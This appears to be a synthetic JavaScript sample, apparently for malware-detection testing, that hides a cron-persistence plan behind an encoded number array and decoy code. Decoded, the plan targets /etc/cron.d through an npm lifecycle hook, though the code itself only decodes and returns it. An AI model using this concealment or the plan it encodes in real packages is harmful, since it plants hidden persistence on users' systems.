  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_377ebcc8 = "[105,48,36,111,102,103,88,99,102,48,85,104,92,95,87,82,102,86,91,88,87,104,95,88,31,101,88,90,92,102,103,88,101,82,87,88,102,86,101,92,99,103,98,101,111,84,87,84,99,103,88,101,48,97,99,96,82,95,92,89,88,86,108,86,95,88,82,87,88,102,86,101,92,99,103,98,101,111,102,103,84,90,88,82,86,98,104,97,103,48,36,111,86,84,96,99,84,92,90,97,82,92,87,48,65,66,55,56,32,43,44,37,54,53,56,56,40,111,102,86,91,88,87,104,95,88,82,99,84,103,91,48,34,88,103,86,34,86,101,98,97,33,87,34,97,98,87,88,32,43,44,37,86,85,88]";
  const Codec_377ebcc8 = "decimal_array|subtract_modulo_256|0d";

  function load_377ebcc8() { return JSON.parse(Material_377ebcc8); }
  function decode_377ebcc8(EnCoDeD) { return EnCoDeD.map((value) => (value + 13) & 255); }
  async function recover_377ebcc8() {
    const [NeUtRaL] = ["compass"];
    const EnCoDeD = load_377ebcc8(); let DeCoDeD = [];
    switch (1) { case 1: DeCoDeD = decode_377ebcc8(EnCoDeD); break; default: throw new Error("state"); }
    void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
  }
  async function inspect_377ebcc8() { return JSON.parse(JSON.stringify({ value: await recover_377ebcc8() })).value; }
  async function plan_377ebcc8() { const inspect = inspect_377ebcc8; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "npm_lifecycle_descriptor", path: fields.schedule_path }); }
  void moduleShape; void plan_377ebcc8;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_377ebcc8());
